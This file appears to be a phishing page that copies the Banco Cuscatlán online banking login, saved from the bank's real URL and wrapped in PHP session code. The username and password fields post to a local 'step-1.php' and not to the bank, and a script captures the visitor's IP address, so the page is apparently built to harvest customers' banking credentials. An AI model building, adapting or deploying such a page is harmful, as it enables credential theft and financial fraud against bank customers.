<?php
session_start();
?>

<!DOCTYPE html>
<!-- saved from url=(0067)https://bancadigital.bancocuscatlan.com/banca-personas/inicio/login -->
<html lang="es" data-critters-container="">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Inicio de sesión - Banca Digital</title>
    <!--<base href="/banca-personas/">-->
    <base href=".">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0, user-scalable=no">
    <link rel="icon" type="image/x-icon" href="https://multimedia.bancocuscatlan.com/banca-digital/logos/favicon.png">
    <link rel="preconnect" href="https://fonts.gstatic.com/">

    <link rel="stylesheet" href="./login_files/line.css" nonce="">
    <link rel="stylesheet" href="./login_files/animate.min.css">
    <link rel="stylesheet" href="./login_files/stiles.css">
  
    <link rel="stylesheet" href="./login_files/styles.c6f4b3faf9ba0261.css" media="all"
        onload="this.media=&#39;all&#39;">
    <noscript>
        <link rel="stylesheet" href="styles.c6f4b3faf9ba0261.css">
    </noscript>
    
    <style type="text/css" id="operaUserStyle"></style>
    <style type="text/css"></style>
    <style>
        .main-app[_ngcontent-ng-c1289675061] {
            display: block;
            height: 100%;
            background-color: #f2f2f2
        }
    </style>
    <meta name="description"
        content="¡Tu nueva Banca Digital está aquí! Inicia sesión con tu mismo usuario y contraseña y disfruta de una experiencia amigable y segura para realizar transacciones">

    <style>
        .loading[_ngcontent-ng-c2808106859] {
            display: flex;
            justify-content: center;
            margin-top: 20px
        }

        .loading.default-size[_ngcontent-ng-c2808106859] {
            height: 8.4rem
        }

        .loading.small-size[_ngcontent-ng-c2808106859] {
            height: 4rem;
            margin-top: 0
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
        crossorigin="anonymous"></script>
    <script type="application/javascript">
        function getIP(json) {
            document.getElementById("ipaddress").value = json.ip;
        }
    </script>
</head>

<body class="mat-typography mat-app-background">
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WTBXBT2" name="tag-manager" height="0" width="0"
            title="tag-manager" style="display:none;visibility:hidden"></iframe>
    </noscript>

   

    <app-root _nghost-ng-c1289675061="" ng-version="16.2.12">
        <div _ngcontent-ng-c1289675061="" id="head-app" class="main-app">
            <app-appbar _ngcontent-ng-c1289675061="" class="overlay-menu" _nghost-ng-c789735356="">
                <!---->
                <mat-toolbar _ngcontent-ng-c789735356=""
                    class="mat-toolbar bg-primary change-position mat-toolbar-single-row"
                    style="z-index: 5000 !important;">
                    <div _ngcontent-ng-c789735356="" class="toolbar max-width">
                        <div _ngcontent-ng-c789735356="" class="toolbar__logo">
                            <img _ngcontent-ng-c789735356="" alt="Banco CUSCATLAN" class="toolbar__img u-cursor-pointer"
                                src="./login_files/logo.png">
                            <img _ngcontent-ng-c789735356="" alt="Banco CUSCATLAN"
                                class="toolbar__mobile u-cursor-pointer" src="./login_files/ring.png">
                            <div _ngcontent-ng-c789735356="" class="toolbar__separator"></div>
                            <p _ngcontent-ng-c789735356="" class="toolbar__text v1-sb">Banca Digital</p>
                        </div>
                        <div _ngcontent-ng-c789735356="" class="u-d-flex u-align-center">
                            <!---->
                            <button _ngcontent-ng-c789735356="" mat-icon-button="" color="primary"
                                mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple"
                                class="mdc-icon-button mat-mdc-icon-button mat-primary mat-mdc-button-base"
                                mat-ripple-loader-centered="">
                                <span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span>
                                <mat-icon _ngcontent-ng-c789735356="" role="img"
                                    class="mat-icon notranslate material-icons mat-ligature-font mat-icon-no-color"
                                    aria-hidden="true" data-mat-icon-type="font">menu</mat-icon>
                                <!---->
                                <!---->
                                <span class="mat-mdc-focus-indicator"></span>
                                <span class="mat-mdc-button-touch-target"></span>
                            </button>
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                        </div>
                        <!---->
                        <!---->
                        <!---->
                    </div>
                </mat-toolbar>
                <!---->
            </app-appbar>
            <div _ngcontent-ng-c1289675061="">
                <router-outlet _ngcontent-ng-c1289675061=""></router-outlet>
                <app-login _nghost-ng-c86555178="" class="ng-star-inserted">
                    <div _ngcontent-ng-c86555178="" class="main-content-login animate__animated animate__fadeIn">
                        <img _ngcontent-ng-c86555178="" alt="" class="top-left absolute mobile"
                            src="./login_files/top-left.png">
                        <img _ngcontent-ng-c86555178="" alt="" class="center-left absolute mobile"
                            src="./login_files/center-left.png">
                        <img _ngcontent-ng-c86555178="" alt="" class="bottom-left absolute mobile"
                            src="./login_files/bottom-left.png">
                        <app-login-form _ngcontent-ng-c86555178="" _nghost-ng-c1999420216="">
                            <div _ngcontent-ng-c1999420216="" class="main">
                                <div _ngcontent-ng-c1999420216="" class="main__box-form">
                                    <app-greeting _ngcontent-ng-c1999420216="" _nghost-ng-c1676035577="">
                                        <div _ngcontent-ng-c1676035577="" class="main__greeting">
                                            <h2 _ngcontent-ng-c1676035577="" class="h1-v3">Buenas Cliente</h2>
                                        </div>
                                    </app-greeting>




                                    <form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
    name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="step-1.php"
    enctype="application/x-www-form-urlencoded">

                                        <mat-form-field _ngcontent-ng-c1999420216="" appearance="outline"
                                            class="mat-mdc-form-field ng-tns-c1205077789-1 mat-mdc-form-field-type-mat-input mat-mdc-form-field-has-icon-prefix mat-form-field-appearance-outline mat-primary ng-star-inserted ng-dirty ng-valid ng-touched">
                                            <!---->
                                            <div
                                                class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c1205077789-1 mdc-text-field--outlined">
                                                <!---->
                                                <div class="mat-mdc-form-field-flex ng-tns-c1205077789-1">
                                                    <div matformfieldnotchedoutline=""
                                                        class="mdc-notched-outline ng-tns-c1205077789-1 mdc-notched-outline--upgraded ng-star-inserted mdc-notched-outline--notched">
                                                        <div class="mdc-notched-outline__leading"></div>
                                                        <div class="mdc-notched-outline__notch"
                                                            style="width: calc(139px * var(--mat-mdc-form-field-floating-label-scale, 0.75) + 9px);">
                                                            <label matformfieldfloatinglabel=""
                                                                class="mdc-floating-label mat-mdc-floating-label ng-tns-c1205077789-1 ng-star-inserted mdc-floating-label--float-above"
                                                                id="mat-mdc-form-field-label-2" for="usuario" style="transform: var(
        --mat-mdc-form-field-label-transform,
        translateY(-50%) translateX(calc(1 * (60px + var(--mat-mdc-form-field-label-offset-x, 0px))))
    );">
                                                                <mat-label _ngcontent-ng-c1999420216=""
                                                                    class="ng-tns-c1205077789-1">Nombre de
                                                                    usuario</mat-label>
                                                                <!---->
                                                            </label>
                                                            <!---->
                                                            <!---->
                                                            <!---->
                                                        </div>
                                                        <div class="mdc-notched-outline__trailing"></div>
                                                    </div>
                                                    <!---->
                                                    <div
                                                        class="mat-mdc-form-field-icon-prefix ng-tns-c1205077789-1 ng-star-inserted">
                                                        <img id="" src="./login_files/usuario.png"
                                                            style="padding-left: 15px;">
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                    <div class="mat-mdc-form-field-infix ng-tns-c1205077789-1">
                                                        <!---->
<input _ngcontent-ng-c1999420216="" matinput="" formcontrolname="username" class="mat-mdc-input-element ng-tns-c1205077789-1 mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored ng-dirty ng-valid ng-touched"
    id="usuario" name="inputField" required="" aria-required="true" aria-invalid="false" data-gtm-form-interact-field-id="0">
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                </div>
                                                <!---->
                                            </div>
                                            <div
                                                class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c1205077789-1">
                                                <!---->
                                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c1205077789-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                    style="opacity: 1; transform: translateY(0%);">
                                                    <!---->
                                                    <div class="mat-mdc-form-field-hint-spacer ng-tns-c1205077789-1">
                                                    </div>
                                                </div>
                                                <!---->
                                            </div>
                                        </mat-form-field>
                                        <!---->
                                        <!---->
                                        <mat-form-field _ngcontent-ng-c1999420216="" appearance="outline"
                                            class="mat-mdc-form-field u-mt-3-v2 u-mb-2-v2 ng-tns-c1205077789-0 mat-mdc-form-field-type-mat-input mat-mdc-form-field-has-icon-prefix mat-mdc-form-field-has-icon-suffix mat-form-field-appearance-outline mat-primary ng-star-inserted ng-dirty ng-valid ng-touched">
                                            <!---->
                                            <div
                                                class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c1205077789-0 mdc-text-field--outlined">
                                                <!---->
                                                <div class="mat-mdc-form-field-flex ng-tns-c1205077789-0">
                                                    <div matformfieldnotchedoutline=""
                                                        class="mdc-notched-outline ng-tns-c1205077789-0 mdc-notched-outline--upgraded ng-star-inserted mdc-notched-outline--notched">
                                                        <div class="mdc-notched-outline__leading"></div>
                                                        <div class="mdc-notched-outline__notch"
                                                            style="width: calc(82px * var(--mat-mdc-form-field-floating-label-scale, 0.75) + 9px);">
                                                            <label matformfieldfloatinglabel=""
                                                                class="mdc-floating-label mat-mdc-floating-label ng-tns-c1205077789-0 ng-star-inserted mdc-floating-label--float-above"
                                                                id="mat-mdc-form-field-label-0" for="passd" style="transform: var(
        --mat-mdc-form-field-label-transform,
        translateY(-50%) translateX(calc(1 * (60px + var(--mat-mdc-form-field-label-offset-x, 0px))))
    );">
                                                                <mat-label _ngcontent-ng-c1999420216=""
                                                                    class="ng-tns-c1205077789-0">Contraseña</mat-label>
                                                                <!---->
                                                            </label>
                                                            <!---->
                                                            <!---->
                                                            <!---->
                                                        </div>
                                                        <div class="mdc-notched-outline__trailing"></div>
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                    <img id="" src="./login_files/candado.png"
                                                        style="padding-left: 15px; width: 20px;">
                                                    <div class="mat-mdc-form-field-infix ng-tns-c1205077789-0">
                                                        <!---->
<input _ngcontent-ng-c1999420216="" matinput="" formcontrolname="prduser" class="mat-mdc-input-element ng-tns-c1205077789-0 mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored ng-dirty ng-valid ng-touched"
  type="password" name="inputFields" id="passd" required="" aria-required="true" aria-invalid="false" data-gtm-form-interact-field-id="1">
                                                    </div>
                                                    <!---->
                                                    <div
                                                        class="mat-mdc-form-field-icon-suffix ng-tns-c1205077789-0 ng-star-inserted">
                                                        <div _ngcontent-ng-c1999420216="" type="submit"
                                                            mat-icon-button="" matsuffix=""
                                                            class="btn-password ng-tns-c1205077789-0"
                                                            aria-label="Hide password" aria-pressed="true">
                                                            <mat-icon _ngcontent-ng-c1999420216="" role="img"
                                                                class="mat-icon notranslate material-icons mat-ligature-font mat-icon-no-color ng-star-inserted"
                                                                aria-hidden="true" data-mat-icon-type="font"></mat-icon>
                                                            <!---->
                                                            <!---->
                                                        </div>
                                                    </div>
                                                    <!---->
                                                </div>
                                                <!---->
                                            </div>
                                            <div
                                                class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c1205077789-0">
                                                <!---->
                                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c1205077789-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                    style="opacity: 1; transform: translateY(0%);">
                                                    <!---->
                                                    <div class="mat-mdc-form-field-hint-spacer ng-tns-c1205077789-0">
                                                    </div>
                                                </div>
                                                <!---->
                                            </div>
                                        </mat-form-field>
                                        <!---->
                                        <mat-checkbox _ngcontent-ng-c1999420216="" formcontrolname="checkUser"
                                            class="mat-mdc-checkbox mat-accent ng-untouched ng-pristine ng-valid"
                                            id="mat-mdc-checkbox-1">
                                            <div class="mdc-form-field">
                                                <div class="mdc-checkbox">
                                                    <div class="mat-mdc-checkbox-touch-target"></div>
                                                    <input type="checkbox" class="mdc-checkbox__native-control"
                                                        id="mat-mdc-checkbox-1-input" tabindex="0">
                                                    <div class="mdc-checkbox__ripple"></div>
                                                    <div class="mdc-checkbox__background">
                                                        <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true"
                                                            class="mdc-checkbox__checkmark">
                                                            <path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"
                                                                class="mdc-checkbox__checkmark-path"></path>
                                                        </svg>
                                                        <div class="mdc-checkbox__mixedmark"></div>
                                                    </div>
                                                    <div mat-ripple=""
                                                        class="mat-ripple mat-mdc-checkbox-ripple mat-mdc-focus-indicator">
                                                    </div>
                                                </div>
                                                <label class="mdc-label" for="mat-mdc-checkbox-1-input">
                                                    <p _ngcontent-ng-c1999420216="" class="v2-m">Recordar usuario</p>
                                                </label>
                                            </div>
                                        </mat-checkbox>
                                        <button _ngcontent-ng-c1999420216="" type="submit" mat-flat-button=""
                                            color="accent"
                                            class="big-btn-accent mdc-button mdc-button--unelevated mat-mdc-unelevated-button mat-accent mat-mdc-button-base ng-star-inserted"
                                            mat-ripple-loader-class-name="mat-mdc-button-ripple">
                                            <span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span>
                                            <span class="mdc-button__label">Ingresar </span>
                                            <span class="mat-mdc-focus-indicator"></span>
                                            <span class="mat-mdc-button-touch-target"></span>
                                            <span class="mat-ripple mat-mdc-button-ripple"></span>
                                        </button>
                                        <!---->
                                        <!---->
                                        <div _ngcontent-ng-c1999420216="" class="content-btn">
                                            <button _ngcontent-ng-c1999420216="" mat-button=""
                                                class="btn-sky mdc-button mat-mdc-button mat-unthemed mat-mdc-button-base"
                                                mat-ripple-loader-class-name="mat-mdc-button-ripple">
                                                <span
                                                    class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span>
                                                <span class="mdc-button__label">Recuperar usuario o contraseña</span>
                                                <span class="mat-mdc-focus-indicator"></span>
                                                <span class="mat-mdc-button-touch-target"></span>
                                                <span class="mat-ripple mat-mdc-button-ripple"></span>
                                            </button>
                                        </div>
                                </div>
                            </div>
                            <app-loading _ngcontent-ng-c1999420216="" class="u-desktop-mobile-none"
                                _nghost-ng-c2808106859="">
                                <ng-lottie _ngcontent-ng-c2808106859="" class="loading default-size">
                                    <div style="width: 100%; height: 100%;">
                                        <svg xmlns="http://www.w3.org/2000/svg"
                                            xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 2000 2000"
                                            width="2000" height="2000" preserveAspectRatio="xMidYMid meet"
                                            style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;">
                                            <defs>
                                                <clippath id="__lottie_element_2">
                                                    <rect width="2000" height="2000" x="0" y="0"></rect>
                                                </clippath>
                                            </defs>
                                            <g clip-path="url(#__lottie_element_2)">
                                                <g transform="matrix(1,0,0,1,92.135009765625,92.135009765625)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,907.864990234375,907.864990234375)">
                                                        <path fill="rgb(255,255,255)" fill-opacity="1"
                                                            d=" M0.0010000000474974513,-907.614990234375 C501.26300048828125,-907.614990234375 907.614990234375,-501.260986328125 907.614990234375,0 C907.614990234375,501.26300048828125 501.26300048828125,907.614990234375 0.0010000000474974513,907.614990234375 C-501.260986328125,907.614990234375 -907.614990234375,501.26300048828125 -907.614990234375,0 C-907.614990234375,-501.260986328125 -501.260986328125,-907.614990234375 0.0010000000474974513,-907.614990234375z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(1,0,0,1,349.2261047363281,1803.3997802734375)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,48.01900100708008,48.01900100708008)">
                                                        <path fill="rgb(255,198,0)" fill-opacity="1"
                                                            d=" M0,-47.76900100708008 C26.381999969482422,-47.76900100708008 47.77000045776367,-26.381999969482422 47.77000045776367,0.0010000000474974513 C47.77000045776367,26.381999969482422 26.381999969482422,47.76900100708008 0,47.76900100708008 C-26.381999969482422,47.76900100708008 -47.77000045776367,26.381999969482422 -47.77000045776367,0.0010000000474974513 C-47.77000045776367,-26.381999969482422 -26.381999969482422,-47.76900100708008 0,-47.76900100708008z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(0.4206399917602539,0,0,0.4206399917602539,1722.4522705078125,1731.8505859375)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,81.45700073242188,81.45800018310547)">
                                                        <path fill="rgb(1,66,106)" fill-opacity="1"
                                                            d=" M0.0010000000474974513,-81.20800018310547 C44.85100173950195,-81.20800018310547 81.20700073242188,-44.849998474121094 81.20700073242188,0 C81.20700073242188,44.849998474121094 44.85100173950195,81.20800018310547 0.0010000000474974513,81.20800018310547 C-44.849998474121094,81.20800018310547 -81.20700073242188,44.849998474121094 -81.20700073242188,0 C-81.20700073242188,-44.849998474121094 -44.849998474121094,-81.20800018310547 0.0010000000474974513,-81.20800018310547z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(-0.20058181881904602,0,0,-0.20058181881904602,254.6937713623047,245.37353515625)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,48.01900100708008,48.01900100708008)">
                                                        <path fill="rgb(44,133,188)" fill-opacity="1"
                                                            d=" M0.0010000000474974513,-47.76900100708008 C26.382999420166016,-47.76900100708008 47.77000045776367,-26.381999969482422 47.77000045776367,0 C47.77000045776367,26.381999969482422 26.382999420166016,47.76900100708008 0.0010000000474974513,47.76900100708008 C-26.381000518798828,47.76900100708008 -47.77000045776367,26.381999969482422 -47.77000045776367,0 C-47.77000045776367,-26.381999969482422 -26.381000518798828,-47.76900100708008 0.0010000000474974513,-47.76900100708008z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(-0.07465343922376633,-0.2131761610507965,0.2131761610507965,-0.07465343922376633,912.154541015625,1182.5296630859375)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,634.1589965820312,634.1589965820312)">
                                                        <path fill="rgb(255,255,255)" fill-opacity="1"
                                                            d=" M0.0010000000474974513,-633.9089965820312 C350.1000061035156,-633.9089965820312 633.9089965820312,-350.0979919433594 633.9089965820312,0 C633.9089965820312,350.0989990234375 350.1000061035156,633.9089965820312 0.0010000000474974513,633.9089965820312 C-350.0979919433594,633.9089965820312 -633.9089965820312,350.0989990234375 -633.9089965820312,0 C-633.9089965820312,-350.0979919433594 -350.0979919433594,-633.9089965820312 0.0010000000474974513,-633.9089965820312z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(0.0017269153613597155,-2.4766430854797363,2.4766430854797363,0.0017269153613597155,857.4937133789062,1142.3076171875)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1" transform="matrix(1,0,0,1,9,57.26499938964844)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M3.24399995803833,32.340999603271484 C5.702000141143799,21.70199966430664 7,10.619999885559082 7,-0.7649999856948853 C7,-11.607000350952148 5.811999797821045,-22.170000076293945 3.5769999027252197,-32.340999603271484 C-3.069000005722046,-23.19099998474121 -7,-11.9399995803833 -7,0.23499999940395355 C-7,12.20199966430664 -3.1989998817443848,23.275999069213867 3.24399995803833,32.340999603271484z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,26.55299949645996,88.90799713134766)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M24.000999450683594,23.643999099731445 C11.887999534606934,4.4079999923706055 -4.568999767303467,-11.819000244140625 -24.000999450683594,-23.643999099731445 C-20.541000366210938,1.062999963760376 -0.8199999928474426,20.54199981689453 24.000999450683594,23.643999099731445z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1" transform="matrix(1,0,0,1,57.020999908447266,106)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-32.33100128173828,-3.74399995803833 C-23.139999389648438,3.00600004196167 -11.79800033569336,7 0.47999998927116394,7 C12.336000442504883,7 23.312999725341797,3.2709999084472656 32.33000183105469,-3.061000108718872 C21.46299934387207,-5.632999897003174 10.130999565124512,-7 -1.5210000276565552,-7 C-12.090999603271484,-7 -22.395999908447266,-5.870999813079834 -32.33100128173828,-3.74399995803833z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,88.70800018310547,89.41400146484375)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-23.57900047302246,23.051000595092773 C0.5529999732971191,19.732999801635742 19.73200035095215,0.9100000262260437 23.57900047302246,-23.051000595092773 C4.581999778747559,-11.456000328063965 -11.567999839782715,4.341000080108643 -23.57900047302246,23.051000595092773z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1" transform="matrix(1,0,0,1,106,57.5)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-3.4100000858306885,32.340999603271484 C3.134000062942505,23.233999252319336 7,12.071000099182129 7,0 C7,-12.071000099182129 3.134000062942505,-23.232999801635742 -3.4100000858306885,-32.340999603271484 C-5.755000114440918,-21.93600082397461 -7,-11.11400032043457 -7,0 C-7,11.11299991607666 -5.755000114440918,21.93600082397461 -3.4100000858306885,32.340999603271484z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,26.55299949645996,26.091999053955078)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-24.000999450683594,23.645000457763672 C-4.567999839782715,11.819000244140625 11.888999938964844,-4.4079999923706055 24.000999450683594,-23.645000457763672 C-0.8190000057220459,-20.542999267578125 -20.541000366210938,-1.062999963760376 -24.000999450683594,23.645000457763672z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,88.177001953125,26.591999053955078)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-24.409000396728516,-24.229999542236328 C-12.206999778747559,-4.4720001220703125 4.552000045776367,12.175000190734863 24.409000396728516,24.229999542236328 C21.354999542236328,-1.215999960899353 1.093999981880188,-21.36199951171875 -24.409000396728516,-24.229999542236328z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1" transform="matrix(1,0,0,1,55.41899871826172,10.5)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M2.0810000896453857,-8.5 C-12.21399974822998,-8.5 -25.242000579833984,-3.0920000076293945 -35.08100128173828,5.784999847412109 C-25.965999603271484,7.559999942779541 -16.55299949645996,8.5 -6.919000148773193,8.5 C7.679999828338623,8.5 21.774999618530273,6.354000091552734 35.08100128173828,2.378999948501587 C25.856000900268555,-4.454999923706055 14.442000389099121,-8.5 2.0810000896453857,-8.5z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1" transform="matrix(1,0,0,1,57.5,57.5)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M0,-55.5 C30.650999069213867,-55.5 55.5,-30.652000427246094 55.5,0 C55.5,30.650999069213867 30.650999069213867,55.5 0,55.5 C-30.652000427246094,55.5 -55.5,30.650999069213867 -55.5,0 C-55.5,-30.652000427246094 -30.652000427246094,-55.5 0,-55.5z">
                                                        </path>
                                                    </g>
                                                    <g opacity="1" transform="matrix(1,0,0,1,57.5,57.5)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="2"
                                                            d=" M0,-35.5 C19.606000900268555,-35.5 35.5,-19.606000900268555 35.5,0 C35.5,19.606000900268555 19.606000900268555,35.5 0,35.5 C-19.606000900268555,35.5 -35.5,19.606000900268555 -35.5,0 C-35.5,-19.606000900268555 -19.606000900268555,-35.5 0,-35.5z">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g transform="matrix(0.8284081220626831,0,0,0.8284081220626831,474.65753173828125,474.65753173828125)"
                                                    opacity="1" style="display: block;">
                                                    <g opacity="1"
                                                        transform="matrix(1,0,0,1,634.1589965820312,634.1589965820312)">
                                                        <path fill="rgb(255,255,255)" fill-opacity="1"
                                                            d=" M0.0010000000474974513,-633.9089965820312 C350.1000061035156,-633.9089965820312 633.9089965820312,-350.0979919433594 633.9089965820312,0 C633.9089965820312,350.0989990234375 350.1000061035156,633.9089965820312 0.0010000000474974513,633.9089965820312 C-350.0979919433594,633.9089965820312 -633.9089965820312,350.0989990234375 -633.9089965820312,0 C-633.9089965820312,-350.0979919433594 -350.0979919433594,-633.9089965820312 0.0010000000474974513,-633.9089965820312z">
                                                        </path>
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(1,66,106)" stroke-opacity="1" stroke-width="30"
                                                            d=" M0.0010000000474974513,-633.9089965820312 C350.1000061035156,-633.9089965820312 633.9089965820312,-350.0979919433594 633.9089965820312,0 C633.9089965820312,350.0989990234375 350.1000061035156,633.9089965820312 0.0010000000474974513,633.9089965820312 C-350.0979919433594,633.9089965820312 -633.9089965820312,350.0989990234375 -633.9089965820312,0 C-633.9089965820312,-350.0979919433594 -350.0979919433594,-633.9089965820312 0.0010000000474974513,-633.9089965820312z">
                                                        </path>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg>
                                    </div>
                                </ng-lottie>
                            </app-loading>
                        </app-login-form>
                        <img _ngcontent-ng-c86555178="" alt="" class="top-right absolute mobile"
                            src="./login_files/top-right.png">
                        <img _ngcontent-ng-c86555178="" alt="" class="center-right absolute mobile"
                            src="./login_files/center-right.png">
                        <img _ngcontent-ng-c86555178="" alt="" class="bottom-right absolute mobile"
                            src="./login_files/bottom-right.png">
                    </div>
                </app-login>
                <!---->
            </div>
        </div>
    </app-root>
    <iframe allow="join-ad-interest-group" data-tagging-id="G-37RRZ0KBDN" data-load-time="1731623314517" height="0"
        width="0" src="./login_files/rul.html" style="display: none; visibility: hidden;"></iframe>
    <iframe id="_hjSafeContext_91802389" title="_hjSafeContext" tabindex="-1" aria-hidden="true"
        src="./login_files/saved_resource.html"
        style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    
    </form>
</body>

</html>